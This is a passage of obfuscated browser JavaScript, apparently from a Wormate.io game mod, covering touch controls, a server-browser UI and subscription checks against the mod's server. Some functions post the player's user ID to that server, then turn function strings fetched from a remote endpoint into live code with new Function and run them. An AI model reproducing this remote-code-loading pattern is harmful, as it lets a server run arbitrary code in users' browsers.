          _0x405cad.img_o_2.y = -220 + _0x4e8187 * 2;
          _0x405cad.img_i_2.alpha = 0.25;
          _0x405cad.img_i_2.x = 75;
          _0x405cad.img_i_2.y = -195 + _0x4e8187 * 2;
          _0x405cad.img_p_2.alpha = 0.25;
          _0x405cad.img_p_2.x = _0x54fce8 - 68;
          _0x405cad.img_p_2.y = _0x4e8187 - 68;
        }
        if (_0x207b06.mo == 3) {
          _0x405cad.img_o_3.alpha = 0.25;
          _0x405cad.img_o_3.x = -50;
          _0x405cad.img_o_3.y = -220 + _0x4e8187 * 2;
          _0x405cad.img_i_3.alpha = 0.25;
          _0x405cad.img_i_3.x = 75;
          _0x405cad.img_i_3.y = -195 + _0x4e8187 * 2;
          _0x405cad.img_p_3.alpha = 0.25;
          _0x405cad.img_p_3.x = _0x54fce8 - 68;
          _0x405cad.img_p_3.y = _0x4e8187 - 68;
        }
        if (_0x207b06.mo == 4) {
          _0x405cad.img_f.visible = true;
          _0x405cad.img_f.x = -250 + _0x54fce8 * 2;
          _0x405cad.img_f.y = -200 + _0x4e8187 * 2;
          _0x405cad.img_o_4.x = 50;
          _0x405cad.img_o_4.y = -220 + _0x4e8187 * 2;
          _0x405cad.img_p_2.alpha = 0.25;
          _0x405cad.img_p_2.x = _0x54fce8 - 68;
          _0x405cad.img_p_2.y = _0x4e8187 - 68;
        }
        if (_0x207b06.mo == 5) {
          _0x405cad.img_f.visible = true;
          _0x405cad.img_f.x = 50;
          _0x405cad.img_f.y = -200 + _0x4e8187 * 2;
          _0x405cad.img_o_4.x = -270 + _0x54fce8 * 2;
          _0x405cad.img_o_4.y = -220 + _0x4e8187 * 2;
          _0x405cad.img_p_2.alpha = 0.25;
          _0x405cad.img_p_2.x = _0x54fce8 - 68;
          _0x405cad.img_p_2.y = _0x4e8187 - 68;
        }
        if (_0x207b06.mo == 6) {
          _0x207b06.j = _0x431976(_0x207b06.mobile);
        }
      }
    };
    let _0x3b38a1 = function (_0xa1de41, _0x5ab2bb) {
      var _0x2bf65b = _0x41ed0b.offsetWidth;
      var _0x52be25 = _0x41ed0b.offsetHeight;
      if (_0x207b06.hz && _0x207b06.mobile) {
        if (_0x5c2dcc.on) {
          if (_0x207b06.tt) {
            if (_0xa1de41 > _0x2bf65b - 30 && _0xa1de41 < _0x2bf65b - 5 && _0x5ab2bb < _0x52be25 / 2 - 33 && _0x5ab2bb > _0x52be25 / 2 - 58) {
              _0x59132f();
            }
            if (_0xa1de41 > _0x2bf65b - 30 && _0xa1de41 < _0x2bf65b - 5 && _0x5ab2bb < _0x52be25 / 2 - 3 && _0x5ab2bb > _0x52be25 / 2 - 28) {
              _0x430cb9();
            }
            if (_0xa1de41 > _0x2bf65b - 30 && _0xa1de41 < _0x2bf65b - 5 && _0x5ab2bb < _0x52be25 / 2 + 28 && _0x5ab2bb > _0x52be25 / 2 + 3 && _0x207b06.z >= 0.2) {
              _0x207b06.z = _0x207b06.z - 0.1;
            }
            if (_0xa1de41 > _0x2bf65b - 30 && _0xa1de41 < _0x2bf65b - 5 && _0x5ab2bb < _0x52be25 / 2 + 58 && _0x5ab2bb > _0x52be25 / 2 + 33) {
              if (_0x207b06.fz) {
                _0x207b06.z = 1.6;
                _0x207b06.fz = false;
              } else if (_0x207b06.z <= 25) {
                _0x207b06.z = _0x207b06.z + 0.1;
              }
            }
          } else {
            if (_0xa1de41 > _0x2bf65b - 332 && _0xa1de41 < _0x2bf65b - 307 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
              _0x59132f();
            }
            if (_0xa1de41 > _0x2bf65b - 302 && _0xa1de41 < _0x2bf65b - 277 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
              _0x430cb9();
            }
            if (_0xa1de41 > _0x2bf65b - 272 && _0xa1de41 < _0x2bf65b - 247 && _0x5ab2bb < 37 && _0x5ab2bb > 12 && _0x207b06.z >= 0.2) {
              _0x207b06.z = _0x207b06.z - 0.1;
            }
            if (_0xa1de41 > _0x2bf65b - 242 && _0xa1de41 < _0x2bf65b - 217 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
              if (_0x207b06.fz) {
                _0x207b06.z = 1.6;
                _0x207b06.fz = false;
              } else if (_0x207b06.z <= 25) {
                _0x207b06.z = _0x207b06.z + 0.1;
              }
            }
          }
        }
      } else if (_0x5c2dcc.on) {
        if (_0xa1de41 > _0x2bf65b - 302 && _0xa1de41 < _0x2bf65b - 277 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
          _0x59132f();
        }
        if (_0xa1de41 > _0x2bf65b - 272 && _0xa1de41 < _0x2bf65b - 247 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
          _0x430cb9();
        }
        if (_0xa1de41 > _0x2bf65b - 242 && _0xa1de41 < _0x2bf65b - 217 && _0x5ab2bb < 37 && _0x5ab2bb > 12) {
          _0x1eba92();
        }
      }
      if (_0x5c2dcc.on && _0xa1de41 >= 0 && _0x5ab2bb >= 0 && (_0x2bf65b = Math.sqrt((_0xa1de41 - _0x2bf65b * 0.5) * (_0xa1de41 - _0x2bf65b * 0.5) + _0x5ab2bb * _0x5ab2bb)) <= 40) {
        _0x3001a1();
      }
    };
    let _0x5ae263 = function (_0x581614) {
      var _0xa853c = document.getElementById("id_customer");
      if (_0xa853c != null) {
        var _0x593a9d = {
          id_wormate: _0xa853c.value,
          names: _0x581614
        };
        fetch(_0x207b06.s_l + "/check", {
          headers: {
            "Content-Type": "application/json"
          },
          method: "POST",
          body: JSON.stringify(_0x593a9d)
        });
      }
    };
    let _0x31baaf = function (_0x5b0344) {
      var _0x434d7a = {
        ao: _0x5b0344
      };
      fetch(_0x207b06.s_l + "/check", {
        headers: {
          "Content-Type": "application/json"
        },
        method: "POST",
        body: JSON.stringify(_0x434d7a)
      });
    };
    let _0x5e9153 = function (_0x934141) {
      var _0x2ea239 = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"];
      var _0x46ea6b = ["SG", "P", "DE", "LT", "US", "BR", "UAE", "FR", "JP", "AU", "IN"];
      var _0x9b064d = "?";
      for (var _0x4e8543 = 0; _0x4e8543 <= 10; _0x4e8543++) {
        let _0x4ca553 = _0x207b06.se[_0x2ea239[_0x4e8543]].indexOf(_0x934141);
        if (_0x4ca553 == -1) ;else {
          _0x9b064d = _0x46ea6b[_0x4e8543] + " " + (_0x4ca553 + 1);
          break;
        }
      }
      ;
      return _0x9b064d;
    };
    let _0x144893 = function (_0x33ba05) {
      for (var _0x109ad3 = _0x33ba05.length, _0x30b2c6 = 0, _0x265ee4 = [], _0x4de84 = 0; _0x4de84 < _0x109ad3; _0x4de84 += 4) {
        _0x265ee4[_0x30b2c6] = _0x33ba05.substr(_0x4de84, 4);
        _0x30b2c6 += 1;
      }
      ;
      return _0x265ee4;
    };
    let _0x2ddbed = function (_0x414de4) {
      var _0x201a5b = _0x414de4.split(".");
      var _0x5a28a7 = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k"];
      for (var _0x718a2c = 0; _0x718a2c <= 10; _0x718a2c++) {
        if (_0x201a5b[_0x718a2c] != "0") {
          _0x207b06.se[_0x5a28a7[_0x718a2c]] = _0x144893(_0x201a5b[_0x718a2c]);
        }
      }
    };
    let _0x3165ec = async function (_0x20af9e, _0x2652e2) {
      var _0xba519a = document.getElementById("epx_time");
      if (_0xba519a != null) {
        _0xba519a.remove();
      }
      var _0x16aca1 = document.getElementById("btnFullScreen");
      if (_0x16aca1 != null) {
        _0x16aca1.remove();
      }
      var _0x1a8b3d = document.getElementById("btn_in_t");
      if (_0x1a8b3d != null) {
        _0x1a8b3d.remove();
      }
      var _0x7c61aa = document.getElementById("btnRePlay");
      if (_0x7c61aa != null) {
        _0x7c61aa.remove();
      }
      var _0x12e18f = document.getElementById("modal_wup");
      if (_0x12e18f != null) {
        _0x12e18f.remove();
      }
      var _0x1d8ac3 = document.getElementById("btn_crsw");
      if (_0x1d8ac3 != null) {
        _0x1d8ac3.remove();
      }
      var _0x21e2f8 = document.getElementById("op_wup");
      if (_0x21e2f8 != null) {
        _0x21e2f8.remove();
      }
      var _0x1ee4f9 = {
        id_wormate: _0x20af9e.userId,
        name: _0x20af9e.username
      };
      let _0xcbade2 = await fetch(_0x207b06.s_l + "/check", {
        headers: {
          "Content-Type": "application/json"
        },
        method: "POST",
        body: JSON.stringify(_0x1ee4f9)
      }).then(async function (_0x1f97c7) {
        return await _0x1f97c7.json();
      }).catch(function () {
        $(".description-text").html(localStorage.getItem("ccg_1"));
      });
      _0x207b06.pL = [];
      _0x207b06.v_z = _0xcbade2.vs;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
      if (_0x207b06.dg != null && _0xcbade2.dsg.join() != _0x207b06.dg.join() || _0x207b06.dg == null && _0xcbade2.dsg.join() != "") {
        _0x207b06.dg = _0xcbade2.dsg;
        localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
        window.location.reload();
      }
      if (_0x1c421d != _0x207b06.v_z) {
        localStorage.removeItem("wupsw");
        window.location.reload();
      }
      document.getElementById("loa831pibur0w4gv");
      if (_0xcbade2.e === "not_connect") {
        $(".description-text").html(localStorage.getItem("ccg_2"));
      } else {
        if (_0xcbade2.e === "not_empty") {
          _0xa71534();
          setTimeout(function () {
            $(".description-text").append(_0xcbade2.cc);
          }, 1400);
          if (_0xcbade2.cr != "") {
            $("#loa831pibur0w4gv").html(_0xcbade2.cr);
          } else {
            $("#loa831pibur0w4gv").html("");
          }
        } else if (_0xcbade2.e === "empty" || _0xcbade2.e === "new") {
          _0xa71534();
        }
        _0x207b06.pL = [..._0xcbade2.propertyList];
      }
      _0x2652e2(_0x20af9e);
      $(".profile-user").append("<div class=\"idwormate\" style=\"margin-left: 20px; margin-top: -35px;\"><input type=\"text\" value=\"" + _0x20af9e.userId + "\" style=\"max-width: 300px; width: 350px !important; height: 22px !important; border-radius: 6px; font-size: 14px; text-align: center; background-color: #fff; color: #0a6928; font-weight: 630; display: inline-block; margin-right: 10px;\"/>\n<button id=\"btn_copy\" style=\"width: 100px; height: 35px; border-radius: 6px; font-size: 15px; background-color: #fff; color: white; border: none; cursor: pointer;\" onclick=\"navigator.clipboard.writeText('" + _0x20af9e.userId + "').then(()=> alert('Your ID " + _0x20af9e.userId + " copied!'));\">Copy</button></div>");
      var _0x39540c = "";
      if (_0xcbade2.e === "not_empty") {
        _0x39540c = "<input type=\"button\" value=\"" + _0xcbade2.ccg[3] + "\" id=\"btnRePlay\">";
        _0x207b06.s_w = _0xcbade2.sw == 1;
      }
      _0x2ddbed(_0xcbade2.s11);
      $("#mm-advice-cont").html("<div class=\"div_FullScreen\"><input type=\"button\" value=\"" + _0xcbade2.ccg[4] + "\" id=\"btnFullScreen\"/><input type=\"button\" value=\"" + _0xcbade2.ccg[5] + "\" id=\"btn_in_t\" style=\"display:none;\"/>" + _0x39540c + "</div>");
      document.getElementById("btnFullScreen").addEventListener("click", function () {
        let _0x498e93 = document.documentElement.requestFullScreen || document.documentElement.webkitRequestFullScreen || document.documentElement.mozRequestFullScreen;
        if (_0x498e93 && !_0x207b06.fullscreen) {
          try {
            _0x207b06.fullscreen = true;
            _0x498e93.call(document.documentElement);
          } catch (_0x34cf40) {}
        } else {
          _0x207b06.fullscreen = false;
          document.exitFullscreen();
        }
      });
      if (_0xcbade2.e === "not_empty") {
        document.getElementById("btnRePlay").addEventListener("click", function () {
          $("#port_id_s").val(_0x207b06.pi);
          $("#port_name_s").val(_0x207b06.pn);
          $("#port_id").val($("#port_id_s").val());
          $("#port_name").val($("#port_name_s").val());
          document.getElementById("mm-action-play").click();
        });
      }
      $("<button id=\"op_wup\" class=\"op_wup\">Settings</button>").insertAfter("#mm-store");
      try {
        if (typeof _0xa69fb6 === "function") {
          _0xa69fb6();
        }
        if (typeof _0xa69fb6 === "function") {
          _0xa69fb6();
        }
        const _0xabc3f6 = await fetch(_0x207b06.s_l + "/settings", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            userId: _0x20af9e.userId,
            isSubscriber: _0x207b06.s_w,
            country: localStorage.getItem("oco") || "iq",
            validateParameter: _0xcbade2
          })
        });
        if (!_0xabc3f6.ok) {
          console.error("Failed to load modal, status:", _0xabc3f6.status);
          return;
        }
        const _0x347a76 = await _0xabc3f6.json();
        if (_0x347a76.status === "subscription_active" && _0x347a76.redirect_info) {
          const _0x3a1f01 = await fetch(_0x347a76.redirect_info.endpoint, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              userId: _0x20af9e.userId,
              accessToken: _0x347a76.redirect_info.access_token,
              country: localStorage.getItem("oco") || "iq",
              validateParameter: _0xcbade2
            })
          });
          if (!_0x3a1f01.ok) {
            return;
          }
          const _0x55ae02 = await _0x3a1f01.json();
          if (!_0x55ae02 || !_0x55ae02.modalHTML) {
            return;
          }
          let _0x1b241e = _0x207b06.s_w ? _0x55ae02.modalHTML.with_skin : _0x55ae02.modalHTML.without_skin;
          _0x1b241e = _0x1b241e.replace(/\$\{app\.userId\}/g, _0x20af9e.userId);
          for (let _0x238c06 = 0; _0x238c06 < _0xcbade2.ccg.length; _0x238c06++) {
            const _0x30e5ce = new RegExp("{ccg" + _0x238c06 + "}", "g");
            _0x1b241e = _0x1b241e.replace(_0x30e5ce, _0xcbade2.ccg[_0x238c06]);
          }
          $(_0x1b241e).insertAfter("#mm-store");
          if (_0x55ae02.functions) {
            for (const [_0x75b31d, _0x1f7a77] of Object.entries(_0x55ae02.functions)) {
              try {
                window[_0x75b31d] = new Function("return " + _0x1f7a77)();
              } catch (_0x23cea7) {}
            }
            if (typeof window.initializeMainSystem === "function") {
              window.initializeMainSystem();
            }
          }
        } else if (_0x347a76.status === "subscription_required" && _0x347a76.redirect_info) {
          const _0x505959 = await fetch(_0x347a76.redirect_info.endpoint, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              userId: _0x20af9e.userId,
              country: localStorage.getItem("oco") || "iq"
            })
          });
          if (!_0x505959.ok) {
            return;
          }
          const _0x4c387a = await _0x505959.json();
          if (_0x4c387a.css && !document.getElementById("basic-modal-css")) {
            $("<style id='basic-modal-css'>").html(_0x4c387a.css).appendTo("head");
          }
          if (_0x4c387a.modalHTML) {
            let _0x17b6ca = _0x4c387a.modalHTML;
            _0x17b6ca = _0x17b6ca.replace(/\$\{app\.userId\}/g, _0x20af9e.userId);
            $("#modal_wup").remove();
            $(_0x17b6ca).insertAfter("#mm-store");
          }
          if (_0x4c387a.functions) {
            for (const [_0xed9d2f, _0x2a4cbd] of Object.entries(_0x4c387a.functions)) {
              try {
                window[_0xed9d2f] = new Function("return " + _0x2a4cbd)();
              } catch (_0x41444c) {}
            }
            if (typeof window.setupBasicModal === "function") {
              setTimeout(() => {
                window.setupBasicModal();
              }, 100);
            }
          }
        } else {
          console.error("❌ Invalid modal system response:", _0x347a76);
          const _0x59326f = "\n          <div id=\"modal_wup\" class=\"modal\"> \n            <div class=\"modal-content\" style=\"max-width: 400px; margin: 50px auto;\"> \n              <div style=\"background: #ff4757; color: white; padding: 15px; text-align: center;\">\n                <h3>⚠️ Connection Error</h3>\n                <p>Unable to load settings. Please try again later.</p>\n                <button onclick=\"window.location.reload()\" style=\"background: white; color: #ff4757; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer;\">\n                  Reload Page\n                </button>\n              </div>\n            </div>\n          </div>";
          $(_0x59326f).insertAfter("#mm-store");
        }
      } catch (_0x3fa043) {
        console.error("💥 Failed to load modal system:", _0x3fa043);
        const _0x383ed3 = "\n        <div id=\"modal_wup\" class=\"modal\"> \n          <div class=\"modal-content\" style=\"max-width: 400px; margin: 50px auto; background: #1e1e1e; color: white;\"> \n            <div style=\"background: #ff4757; color: white; padding: 15px; text-align: center; border-radius: 8px 8px 0 0;\">\n              <h3>❌ System Error</h3>\n            </div>\n            <div style=\"padding: 20px; text-align: center;\">\n              <p>Failed to connect to settings server.</p>\n              <p style=\"font-size: 12px; color: #aaa;\">Error: " + _0x3fa043.message + "</p>\n              <button onclick=\"window.location.reload()\" style=\"background: #4CAF50; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin-top: 10px;\">\n                🔄 Try Again\n              </button>\n            </div>\n          </div>\n        </div>";
        $(_0x383ed3).insertAfter("#mm-store");
      }
      setTimeout(() => {
        if (!$("#op_wup").length) {
          $("<button id=\"op_wup\" class=\"op_wup\">⚙️ Settings</button>").insertAfter("#mm-store");
        }
        $(document).off("click", "#op_wup").on("click", "#op_wup", function (_0x51eb21) {
          _0x51eb21.preventDefault();
          const _0x143e15 = $("#modal_wup");
          if (_0x143e15.length) {
            _0x143e15.css({
              display: "block",
              "z-index": "9999"
            });
          } else {
            console.error("❌ Modal not found!");
            alert("Settings modal not loaded. Please reload the page.");
          }
          return false;
        });
      }, 500);
      if (_0xcbade2.cm === "" || _0xcbade2.cm === undefined) {} else {
        var _0x687fb4 = document.getElementById("btn_in_t");
        var _0x5c575b = document.getElementById("mm-action-play");
        var _0x39d5f0 = document.getElementById("port_id");
        if (_0x687fb4 && _0x5c575b && _0x39d5f0) {
          _0x687fb4.style.display = "block";
          _0x687fb4.onclick = function () {
            _0x39d5f0.value = _0xcbade2.cm;
            _0x5c575b.click();
          };
          window.texture6 = true;
        }
      }
      if (_0xcbade2.e === "not_connect") {} else {
        _0x207b06.h = _0xcbade2.z == "b";
        _0x207b06.hz = _0xcbade2.z == "c";
        window.userIsSubscribed = _0x207b06.h || _0x207b06.hz;
        if (_0xcbade2.e === "not_empty" || window.texture6) {
          setTimeout(() => {
            _0x2c05b4(_0xcbade2);
            _0x5ccd40(_0xcbade2);
            _0xcf303d(_0xcbade2);
            if (_0x207b06.s_w) {
              _0x46f479();
            }
          }, 100);
        }
        if (_0xcbade2.ccc && _0xcbade2.ccc != "iq" && _0xcbade2.ccc != _0x251a97) {
          localStorage.setItem("oco", _0xcbade2.ccc);
          localStorage.removeItem("wupsw");
          window.location.reload();
        }
        if (!_0x251a97) {
          localStorage.setItem("oco", "iq");
        }
      }
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    };
    function _0xa71534() {
      window.currentDisplayMode = "timmap";
      if (typeof window.servers === "undefined") {
        window.servers = {
          Api_listServer: []
        };
      }
      function _0x117e5b() {
        try {
          const _0x41dc30 = localStorage.getItem("cachedServers");
          if (_0x41dc30) {
            const _0x215eb6 = JSON.parse(_0x41dc30);
            const _0x174d6b = _0x215eb6.timestamp;
            const _0x475a0b = new Date().getTime();
            if (_0x475a0b - _0x174d6b < 3600000) {
              window.servers = _0x215eb6.data;
              return true;
            }
          }
        } catch (_0x1af997) {
          console.error("خطأ في تحميل البيانات المحفوظة:", _0x1af997);
        }
        return false;
      }
      async function _0xa255e5() {
        try {
          const _0x27047d = await fetch(_0x207b06.s_l + "/servers");
          if (_0x27047d.ok) {
            const _0x41912a = await _0x27047d.json();
            if (_0x41912a.success && Array.isArray(_0x41912a.servers)) {
              window.servers.Api_listServer = _0x41912a.servers.filter(_0x12b5c3 => _0x12b5c3.serverUrl);
              try {
                const _0x51957e = {
                  timestamp: new Date().getTime(),
                  data: window.servers
                };
                localStorage.setItem("cachedServers", JSON.stringify(_0x51957e));
              } catch (_0x11bf61) {
                console.warn("فشل في حفظ البيانات:", _0x11bf61);
              }
              return true;
            }
          }
        } catch (_0x36fd2a) {
          console.error("خطأ في تحميل السيرفرات:", _0x36fd2a);
        }
        return false;
      }
      function _0x1fb425() {
        return "\n              <div class=\"title-wormate-server\">S E R V E R S</div>\n              <div class=\"description-text-hiep\">\n                  <div style=\"position:sticky; top:0; z-index:100; background:#242424;\">\n                      <br>\n                        <ul style=\"margin-top:5px\" class=\"ui-tabs-nav\">\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive0 ui-tab-active\" style=\"margin:-5px\">\n                               <a><span class=\"flag br\" value=\"' + atob(savedImages[70]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive1\" style=\"margin:-5px\">\n                               <a><span class=\"flag mx\" value=\"' + atob(savedImages[71]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive2\" style=\"margin:-5px\">\n                               <a><span class=\"flag us\" value=\"' + atob(savedImages[72]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive3\" style=\"margin:-5px\">\n                               <a><span class=\"flag ca\" value=\"' + atob(savedImages[73]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive4\" style=\"margin:-5px\">\n                               <a><span class=\"flag de\" value=\"' + atob(savedImages[74]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive5\" style=\"margin:-5px\">\n                               <a><span class=\"flag fr\" value=\"' + atob(savedImages[75]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive6\" style=\"margin:-5px\">\n                               <a><span class=\"flag sg\" value=\"' + atob(savedImages[76]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive7\" style=\"margin:-5px\">\n                               <a><span class=\"flag jp\" value=\"' + atob(savedImages[77]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive8\" style=\"margin:-5px\">\n                               <a><span class=\"flag au\" value=\"' + atob(savedImages[78]) + '\"></span></a>\n                           </li>\n                           <li class=\"ui-tabs-tab ui-tab ui-tab-inactive9\" style=\"margin:-5px\">\n                               <a><span class=\"flag gb\" value=\"' + atob(savedImages[79]) + '\"></span></a>\n                           </li>\n                        </ul>\n                      \n                      <div style=\"text-align: center; margin: 2px 0; padding: 2px;\">\n                          <button id=\"sort-toggle\" style=\"font-size: 10px; padding: 1px 6px; background-color: #333; color: #ddd; border: 1px solid #666; border-radius: 3px; cursor: pointer; outline: none;\">Timmap Servers</button>\n                      </div>\n                      \n                      <div class=\"gachngang\"></div>\n                      <div class=\"server-header\">\n                          <div class=\"header-name\">SERVER</div>\n                          <div class=\"header-region\">REGION</div>\n                          <div class=\"header-status\">STATUS</div>\n                          <div class=\"header-score\">SCORE</div>\n                      </div>\n                      <div class=\"gachngang\"></div>\n                  </div>\n                  \n                  <div class=\"background-image-container\">\n                      <img src=\"https://wormup.in/images/Background/serverbg.jpg\" class=\"background-image\">\n                  </div>\n                  \n                  <div class=\"servers-container\">\n                      <div class=\"servers-de\"></div>\n                      <div class=\"servers-uae\" style=\"display:none\"></div>\n                      <div class=\"servers-us\" style=\"display:none\"></div>\n                      <div class=\"servers-ca\" style=\"display:none\"></div>\n                      <div class=\"servers-br\" style=\"display:none\"></div>\n                      <div class=\"servers-fr\" style=\"display:none\"></div>\n                      <div class=\"servers-sg\" style=\"display:none\"></div>\n                      <div class=\"servers-jp\" style=\"display:none\"></div>\n                      <div class=\"servers-gb\" style=\"display:none\"></div>\n                      <div class=\"servers-au\" style=\"display:none\"></div>\n                  </div>\n              </div>\n          ";
      }
      function _0x1939a0() {
        if (!window.servers || !window.servers.Api_listServer || window.servers.Api_listServer.length === 0) {
          return;
        }
        const _0x3a25d6 = {
          de: {
            code: "DE",
            container: "servers-de"
          },
          uae: {
            code: "UAE",
            container: "servers-uae"
          },
          us: {
            code: "US",
            container: "servers-us"
          },
          ca: {
            code: "LT",
            container: "servers-ca"
          },
          br: {
            code: "BR",
            container: "servers-br"
          },
          fr: {
            code: "FR",
            container: "servers-fr"
          },
          sg: {
            code: "SG",
            container: "servers-sg"
          },
          jp: {
            code: "JP",
            container: "servers-jp"
          },
          gb: {
            code: "IN",
            container: "servers-gb"
          },
          au: {
            code: "UK",
            container: "servers-au"
          }
        };
        Object.values(_0x3a25d6).forEach(_0x4d1e33 => {
          $("." + _0x4d1e33.container).empty();
        });
        let _0x617430 = window.currentDisplayMode || "timmap";
        const _0x578a90 = {};
        Object.keys(_0x3a25d6).forEach(_0x53c217 => {
          _0x578a90[_0x53c217] = [];
        });
        window.servers.Api_listServer.forEach(_0x579566 => {
          let _0x164097 = null;
          if (_0x617430 === "timmap" && _0x579566.timmap) {
            _0x164097 = _0x579566.timmap;
          } else if (_0x617430 === "wormworld" && _0x579566.wormworld) {
            _0x164097 = _0x579566.wormworld;
          }
          if (_0x164097 && _0x578a90[_0x579566.region]) {
            _0x579566.displayNumber = _0x164097;
            _0x578a90[_0x579566.region].push(_0x579566);
          }
        });
        Object.keys(_0x578a90).forEach(_0x409963 => {
          const _0x5dfa13 = _0x578a90[_0x409963];
          const _0x5ae8a6 = _0x3a25d6[_0x409963];
          if (_0x5dfa13.length > 0) {
            _0x5dfa13.sort((_0x10544e, _0x28c69d) => (_0x10544e.displayNumber || 0) - (_0x28c69d.displayNumber || 0));
            _0x5dfa13.forEach(_0x29aa4d => {
              const _0x435daf = _0x29aa4d.displayNumber;
              const _0x573138 = _0x29aa4d.name || "WW";
              const _0x2b0bca = _0x29aa4d.image || atob(_0x56e2a2[80]);
              const _0x21db83 = _0x5ae8a6.code + " " + _0x435daf;
              const _0x92acd9 = _0x5ae8a6.code + " " + _0x435daf;
              const _0x46f357 = "\n                          <div class=\"selectSala\" \n                               id=\"" + _0x409963 + "\" \n                               value=\"" + _0x29aa4d.serverUrl + "\" \n                               data-server-name=\"" + _0x573138 + "\" \n                               data-region-name=\"" + _0x5ae8a6.code + "\" \n                               data-server-number=\"" + _0x435daf + "\" \n                               data-server-image=\"" + _0x2b0bca + "\"\n                               data-con=\"" + _0x29aa4d.serverUrl + "\" \n                               data-room=\"" + _0x21db83 + "\"\n                               data-type=\"false\">\n                              <div class=\"server-image\">\n                                  <img src=\"" + _0x2b0bca + "\" alt=\"" + _0x573138 + "\">\n                              </div>\n                              <div class=\"server-info\">\n                                  <span class=\"server-number\" style=\"color: " + (_0x617430 === "wormworld" ? "#00a8ff" : "#f00") + "\">" + _0x435daf + ".</span>\n                                  <span class=\"server-name\">" + _0x573138 + "</span>\n                              </div>\n                              <div class=\"server-region\">" + _0x21db83 + "</div>\n                              <div class=\"server-status\">\n                                  <span class=\"green-dot\"></span>\n                              </div>\n                              <div class=\"server-score\">-</div>\n                          </div>\n                      ";
              $("." + _0x5ae8a6.container).append(_0x46f357);
              $("." + _0x5ae8a6.container + " .selectSala:last").click(function (_0x4d15b9) {
                if ($(_0x4d15b9.target).closest(".server-image-with-link").length > 0) {
                  return;
                }
                var _0x416fa6 = $(this).attr("value");
                $("#port_id").val(_0x416fa6);
                var _0x3fc903 = _0x92acd9;
                $("#port_name").val(_0x3fc903);
                document.getElementById("mm-action-play").click();
              });
              if (_0x29aa4d.imageUrl && _0x29aa4d.imageUrl.trim() !== "") {
                $("." + _0x5ae8a6.container + " .selectSala:last .server-image").addClass("server-image-with-link");
                $("." + _0x5ae8a6.container + " .selectSala:last .server-image").click(function (_0x2d0b81) {
                  _0x2d0b81.stopPropagation();
                  _0x2d0b81.preventDefault();
                  window.open(_0x29aa4d.imageUrl, "_blank");
                });
              }
            });
          } else {
            $("." + _0x5ae8a6.container).append("\n                      <div style=\"text-align:center; padding:20px; color:#aaa;\">\n                          No servers available in this region\n                      </div>\n                  ");
          }
        });
        setTimeout(_0x12615a, 1000);
      }
      function _0x12615a() {
        fetch(_0x207b06.s_l + "/wormate-api.php?t=" + Date.now()).then(_0x3fc5e8 => _0x3fc5e8.json()).then(_0x20c49c => {
          if (_0x20c49c && Array.isArray(_0x20c49c)) {
            $(".selectSala").each(function () {
              const _0xecd41c = $(this);
              const _0x388221 = _0xecd41c.attr("value");
              const _0xbf4ae0 = _0x20c49c.find(_0x2ff296 => _0x2ff296.serverUrl === _0x388221);
              _0xecd41c.find(".green-dot").css("display", "none");
              if (_0xbf4ae0 && _0xbf4ae0.players && _0xbf4ae0.players.length > 0) {
                const _0x2edd70 = _0xbf4ae0.players[0];
                const _0x23b845 = _0x4b0125(_0x2edd70.score);
                const _0x57668b = _0x2edd70.score >= 1000000;
                _0xecd41c.find(".server-score").html("<span class=\"score-display " + (_0x57668b ? "million" : "regular") + "\">" + _0x23b845 + "</span>");
                if (_0xbf4ae0.players.length >= 4) {
                  const _0x429484 = _0xbf4ae0.players.slice(0, 4).every(_0x55aab9 => _0x55aab9.score >= 1000000);
                  if (_0x429484) {
                    _0xecd41c.find(".green-dot").css("display", "block");
                  }
                }
                _0xecd41c.data("players", JSON.stringify(_0xbf4ae0.players));
              } else {
                _0xecd41c.find(".server-score").html("-");
              }
            });
          }
        }).catch(_0x4eeca3 => console.error("خطأ في جلب بيانات السيرفرات:", _0x4eeca3));
      }
      function _0x4b0125(_0x34a9b0) {
        if (_0x34a9b0 >= 1000000) {
          return (_0x34a9b0 / 1000000).toFixed(2) + "M";
        } else if (_0x34a9b0 >= 1000) {
          return (_0x34a9b0 / 1000).toFixed(1) + "K";
        } else {
          return _0x34a9b0.toFixed(0);
        }
      }
      function _0x5b8854() {
        const _0xcffaff = {
          mx: "servers-uae",
          br: "servers-de",
          us: "servers-us",
          ca: "servers-ca",
          de: "servers-br",
          fr: "servers-fr",
          sg: "servers-sg",
          jp: "servers-jp",
          au: "servers-gb",
          gb: "servers-au"
        };
        $(".flag").off("click");
        Object.keys(_0xcffaff).forEach((_0x4fbf17, _0x38cd7c) => {
          $(".flag." + _0x4fbf17).on("click", function (_0x36909f) {
            _0x36909f.preventDefault();
            _0x36909f.stopPropagation();
            $(".ui-tabs-nav .ui-tab").removeClass("ui-tab-active");
            $(this).closest(".ui-tab").addClass("ui-tab-active");
